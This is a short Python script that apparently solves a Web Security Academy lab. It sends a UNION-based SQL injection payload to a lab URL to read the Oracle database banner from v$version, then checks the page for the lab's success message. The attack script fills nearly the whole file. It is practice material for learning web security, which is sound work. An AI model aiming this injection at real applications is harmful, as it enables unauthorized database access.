# Retrieving data from other database tables
# Examining DB- querying the database type and version on Oracle

import requests

# 2 columns - strings
url = "https://ac201f211f9ad02a80340f28005f0016.web-security-academy.net/filter?category=Pets"
payload = "' UNION SELECT NULL, Banner FROM v$version--"

try:
    r_solve = requests.get(url+payload)
    if "Congratulations, you solved the lab!" in r_solve.text:
        print("yeet!")
    else:
        print("sad noises :(")
except Exception as e:
    print("Something went wrong:", e)